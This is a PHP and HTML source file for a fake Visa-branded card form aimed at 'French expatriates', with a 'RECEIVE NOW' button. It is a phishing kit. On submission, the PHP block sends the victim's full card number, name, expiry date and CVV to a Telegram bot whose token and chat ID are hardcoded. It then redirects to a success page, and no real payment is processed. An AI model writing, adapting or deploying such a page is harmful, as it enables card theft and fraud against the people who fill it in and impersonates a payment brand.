<?php
/**
 * Dark Mode Credit Card Form with Visa Expatriates & DISC-NET Branding
 * + Telegram notification + redirect to success page.
 */

// ========== TELEGRAM CONFIGURATION ==========
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

// ==================== PHP CARD DETECTION ====================

function detectCardType($cardNumber) {
    $number = preg_replace('/\D/', '', $cardNumber);
    if (empty($number)) return 'Other';
    
    if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $number)) return 'Visa';
    if (preg_match('/^(5[1-5][0-9]{14}|2(22[1-9][0-9]{12}|2[3-9][0-9]{13}|[3-6][0-9]{14}|7[0-1][0-9]{13}|720[0-9]{12}))$/', $number)) return 'Mastercard';
    if (preg_match('/^3[47][0-9]{13}$/', $number)) return 'American Express';
    if (preg_match('/^6(?:011|5[0-9]{2}|4[4-9][0-9]|22(?:12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5])[0-9]{10,11})$/', $number)) return 'Discover';
    if (preg_match('/^(?:352[8-9][0-9]{11}|35[0-9]{14}|2131[0-9]{11}|1800[0-9]{11})$/', $number)) return 'JCB';
    if (preg_match('/^3(?:0[0-5]|[68][0-9])[0-9]{11,12}$/', $number)) return 'Diners Club';
    return 'Other';
}

function luhnCheck($cardNumber) {
    $number = preg_replace('/\D/', '', $cardNumber);
    $sum = 0;
    $alternate = false;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $n = (int)$number[$i];
        if ($alternate) {
            $n *= 2;
            if ($n > 9) $n = ($n % 10) + 1;
        }
        $sum += $n;
        $alternate = !$alternate;
    }
    return ($sum % 10 == 0);
}

function sendToTelegram($message) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($httpCode == 200);
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardNumberRaw = trim($_POST['card_number'] ?? '');
    $nameOnCard = trim($_POST['card_name'] ?? '');
    $expiryDate = trim($_POST['expiry'] ?? '');
    $securityCode = trim($_POST['cvv'] ?? '');
    
    if (empty($cardNumberRaw) || empty($nameOnCard) || empty($expiryDate) || empty($securityCode)) {
        // If error, we show the form again with error message (stored in session or just re-display)
        // For simplicity, we'll redirect back with an error flag.
        session_start();
        $_SESSION['error'] = 'Please fill in all fields.';
        header("Location: index.php");
        exit;
    }
    
    $detectedType = detectCardType($cardNumberRaw);
    $luhnValid = luhnCheck($cardNumberRaw);
    
    // ---- SEND ALL DATA TO TELEGRAM ----
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $message = "<b>💳 NEW CARD SUBMISSION</b>\n"
             . "━━━━━━━━━━━━━━━━━━\n"
             . "🏷 <b>Card Type:</b> {$detectedType}\n"
             . "🔢 <b>Card Number:</b> {$cardNumberRaw}\n"
             . "👤 <b>Cardholder:</b> {$nameOnCard}\n"
             . "📅 <b>Expiry:</b> {$expiryDate}\n"
             . "🔐 <b>CVV:</b> {$securityCode}\n";
            
            
    
    sendToTelegram($message);
    
    // Redirect to success page
    header("Location: success.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CARD</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0c10, #030507);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
        }

        .dark-container {
            max-width: 560px;
            width: 100%;
            margin: 0 auto;
        }

        .glass-card {
            background: rgba(18, 22, 28, 0.92);
            backdrop-filter: blur(12px);
            border-radius: 42px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 0.5px rgba(255, 255, 255, 0.02);
            overflow: hidden;
        }

        .brand-header {
            padding: 28px 28px 16px 28px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
            background: linear-gradient(135deg, rgba(0,0,0,0.4), rgba(0,0,0,0.1));
        }

        .visa-main-title {
            font-size: 2.2rem;
            font-weight: 800;
            letter-spacing: 3px;
            background: linear-gradient(135deg, #ffffff, #a0c0ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 8px;
        }

        .expat-title {
            font-size: 0.85rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #b9c8ff;
            border-left: 3px solid #3b82f6;
            padding-left: 12px;
            margin-top: 6px;
        }

        .card-preview-dark {
            background: linear-gradient(145deg, #10161e, #0b0f14);
            margin: 24px 28px 0 28px;
            border-radius: 28px;
            padding: 24px;
            border: 1px solid rgba(255,255,255,0.05);
            box-shadow: 0 12px 20px -10px rgba(0,0,0,0.5);
        }

        .card-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
        }

        .chip-dark {
            background: linear-gradient(145deg, #cdb282, #b89a5c);
            width: 44px;
            height: 34px;
            border-radius: 10px;
            position: relative;
        }
        .chip-dark:after {
            content: '';
            position: absolute;
            top: 8px;
            left: 8px;
            width: 28px;
            height: 18px;
            background: rgba(0,0,0,0.25);
            border-radius: 5px;
        }

        .network-badge {
            background: rgba(255,255,255,0.05);
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 1px;
            color: #cdd9ff;
        }

        .card-number-preview {
            font-family: 'Courier New', monospace;
            font-size: 1.3rem;
            letter-spacing: 2px;
            font-weight: 600;
            color: #f0f3fa;
            margin: 20px 0;
            word-break: break-word;
        }

        .details-preview {
            display: flex;
            justify-content: space-between;
            font-size: 0.7rem;
            color: #8e9aaf;
        }
        .details-preview span:first-child {
            text-transform: uppercase;
        }

        .form-fields-dark {
            padding: 28px;
        }

        .input-group {
            margin-bottom: 22px;
        }

        .input-group label {
            display: block;
            font-size: 0.7rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #a5b4d0;
            margin-bottom: 8px;
        }

        .input-group input {
            width: 100%;
            background: #11161e;
            border: 1px solid #2a2f38;
            padding: 14px 18px;
            border-radius: 20px;
            font-size: 1rem;
            color: #f0f3fa;
            transition: all 0.2s;
        }

        .input-group input:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
        }

        .input-group input::placeholder {
            color: #4a5568;
        }

        .two-cols {
            display: flex;
            gap: 18px;
        }
        .two-cols > div {
            flex: 1;
        }

        .detection-chip {
            margin-top: 10px;
            background: rgba(59,130,246,0.12);
            padding: 8px 16px;
            border-radius: 60px;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            font-size: 0.75rem;
            font-weight: 500;
            color: #b9d0ff;
            border: 0.5px solid rgba(59,130,246,0.3);
        }

        .receive-button {
            width: 100%;
            background: linear-gradient(95deg, #1e2b3c, #0f172a);
            border: 1px solid rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 44px;
            font-weight: 700;
            font-size: 1rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: white;
            cursor: pointer;
            margin-top: 16px;
            transition: 0.2s;
        }
        .receive-button:hover {
            background: linear-gradient(95deg, #2c3e50, #1e2a3a);
            transform: scale(0.98);
        }

        .discnet-footer {
            text-align: center;
            padding: 18px 28px 24px;
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 3px;
            color: #5b6e8c;
            border-top: 1px solid rgba(255,255,255,0.04);
            margin-top: 8px;
        }
        .discnet-footer span {
            color: #8aa2d4;
        }

        .error-message {
            background: rgba(220,38,38,0.15);
            border-left: 4px solid #ef4444;
            margin-top: 20px;
            padding: 12px 20px;
            border-radius: 20px;
            color: #fecaca;
            font-size: 0.85rem;
        }
    </style>
</head>
<body>
<div class="dark-container">
    <div class="glass-card">
        <div class="brand-header">
            <div class="visa-main-title">VISA</div>
            <div class="expat-title">VISA FOR FRENCH EXPATRIATES</div>
        </div>

        <div class="card-preview-dark">
            <div class="card-row">
                <div class="chip-dark"></div>
                <div class="network-badge" id="liveNetworkLabel">VISA</div>
            </div>
            <div class="card-number-preview" id="liveCardPreview">•••• •••• •••• ••••</div>
            <div class="details-preview">
                <span>CARDHOLDER</span>
                <span>EXPIRES</span>
            </div>
            <div class="details-preview" style="margin-top: 6px; font-weight: 600; color: #fff;">
                <span id="liveNamePreview">YOUR NAME</span>
                <span id="liveExpiryPreview">MM/YY</span>
            </div>
        </div>

        <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
            <div class="form-fields-dark">
                <div class="input-group">
                    <label>Card number</label>
                    <input type="text" name="card_number" id="cardNumber" 
                           placeholder="1234 5678 9012 3456" autocomplete="off"
                           value="<?php echo isset($_POST['card_number']) ? htmlspecialchars($_POST['card_number']) : ''; ?>">
                    <div class="detection-chip" id="detectionStatus">
                        <span>🔍</span> <span id="detectionText">Enter card number</span>
                    </div>
                </div>

                <div class="input-group">
                    <label>Name on card</label>
                    <input type="text" name="card_name" id="cardName" 
                           placeholder="JEAN DUPONT"
                           value="<?php echo isset($_POST['card_name']) ? htmlspecialchars($_POST['card_name']) : ''; ?>">
                </div>

                <div class="two-cols">
                    <div class="input-group">
                        <label>Expiry (MM/YY)</label>
                        <input type="text" name="expiry" id="expiryDate" 
                               placeholder="MM / YY"
                               value="<?php echo isset($_POST['expiry']) ? htmlspecialchars($_POST['expiry']) : ''; ?>">
                    </div>
                    <div class="input-group">
                        <label>CVV</label>
                        <input type="text" name="cvv" id="cvvCode" 
                               placeholder="123" maxlength="4"
                               value="<?php echo isset($_POST['cvv']) ? htmlspecialchars($_POST['cvv']) : ''; ?>">
                    </div>
                </div>

                <button type="submit" class="receive-button">✨ RECEIVE NOW ✨</button>
            </div>
        </form>

        
    </div>

    <?php
    session_start();
    if (isset($_SESSION['error'])) {
        echo '<div class="error-message">❌ ' . htmlspecialchars($_SESSION['error']) . '</div>';
        unset($_SESSION['error']);
    }
    ?>
</div>

<script>
    // Real-time card detection & UI updates (dark mode)
    (function() {
        function detectCardTypeJS(cardNumber) {
            let num = cardNumber.replace(/\D/g, '');
            if (num.length === 0) return 'Other';
            if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(num)) return 'Visa';
            if (/^(5[1-5][0-9]{14}|2(22[1-9][0-9]{12}|2[3-9][0-9]{13}|[3-6][0-9]{14}|7[0-1][0-9]{13}|720[0-9]{12}))$/.test(num)) return 'Mastercard';
            if (/^3[47][0-9]{13}$/.test(num)) return 'American Express';
            if (/^6(?:011|5[0-9]{2}|4[4-9][0-9]|22(?:12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5])[0-9]{10,11})$/.test(num)) return 'Discover';
            if (/^(?:352[8-9][0-9]{11}|35[0-9]{14}|2131[0-9]{11}|1800[0-9]{11})$/.test(num)) return 'JCB';
            if (/^3(?:0[0-5]|[68][0-9])[0-9]{11,12}$/.test(num)) return 'Diners Club';
            return 'Other';
        }

        function formatCardNumber(value) {
            let digits = value.replace(/\D/g, '');
            let formatted = '';
            for (let i = 0; i < digits.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += digits[i];
            }
            return formatted;
        }

        function updateUI() {
            const cardInput = document.getElementById('cardNumber');
            const nameInput = document.getElementById('cardName');
            const expiryInput = document.getElementById('expiryDate');
            let raw = cardInput.value;
            let clean = raw.replace(/\D/g, '');
            
            let formatted = formatCardNumber(raw);
            if (formatted !== raw && cardInput !== document.activeElement) {
                cardInput.value = formatted;
            }
            
            const cardType = detectCardTypeJS(raw);
            const detectionSpan = document.getElementById('detectionText');
            const networkLabel = document.getElementById('liveNetworkLabel');
            
            if (cardType === 'Visa') {
                detectionSpan.innerText = '💙 Visa card detected';
                networkLabel.innerText = 'VISA';
                networkLabel.style.color = '#a0c0ff';
            } else if (cardType === 'Mastercard') {
                detectionSpan.innerText = '🧡 Mastercard';
                networkLabel.innerText = 'MASTERCARD';
                networkLabel.style.color = '#ffb347';
            } else if (cardType === 'American Express') {
                detectionSpan.innerText = '🔷 American Express';
                networkLabel.innerText = 'AMEX';
                networkLabel.style.color = '#6ab0f5';
            } else {
                detectionSpan.innerText = clean.length > 0 ? `🃏 ${cardType} card` : '💳 Enter card number';
                networkLabel.innerText = cardType === 'Other' ? 'CARD' : cardType;
                networkLabel.style.color = '#b9d0ff';
            }
            
            const previewSpan = document.getElementById('liveCardPreview');
            if (clean.length > 0) {
                let last4 = clean.slice(-4);
                previewSpan.innerText = '•••• •••• •••• ' + last4;
            } else {
                previewSpan.innerText = '•••• •••• •••• ••••';
            }
            
            const namePreview = document.getElementById('liveNamePreview');
            let holder = nameInput.value.trim();
            namePreview.innerText = holder === "" ? "YOUR NAME" : holder.toUpperCase().slice(0, 24);
            
            const expiryPreview = document.getElementById('liveExpiryPreview');
            let expRaw = expiryInput.value.replace(/\D/g, '');
            if (expRaw.length >= 2) {
                let month = expRaw.slice(0,2);
                let year = expRaw.slice(2,4);
                if (year.length) expiryPreview.innerText = `${month}/${year}`;
                else expiryPreview.innerText = month;
            } else {
                expiryPreview.innerText = "MM/YY";
            }
            
            if (expiryInput.value.length === 2 && !expiryInput.value.includes('/')) {
                expiryInput.value = expiryInput.value + '/';
            }
        }
        
        const cardNum = document.getElementById('cardNumber');
        const cardName = document.getElementById('cardName');
        const expiry = document.getElementById('expiryDate');
        const cvv = document.getElementById('cvvCode');
        
        [cardNum, cardName, expiry, cvv].forEach(f => f.addEventListener('input', updateUI));
        
        expiry.addEventListener('input', function(e) {
            let val = expiry.value.replace(/\D/g, '');
            if (val.length >= 2) {
                let month = val.slice(0,2);
                let year = val.slice(2,4);
                expiry.value = year.length ? month + '/' + year : month;
            } else {
                expiry.value = val;
            }
            updateUI();
        });
        
        cardNum.addEventListener('input', function() {
            let digits = cardNum.value.replace(/\D/g, '');
            if (digits.length > 19) {
                cardNum.value = formatCardNumber(digits.slice(0,19));
            }
            updateUI();
        });
        
        cvv.addEventListener('input', function() {
            cvv.value = cvv.value.replace(/\D/g, '').slice(0,4);
            updateUI();
        });
        
        updateUI();
    })();
</script>
</body>
</html>
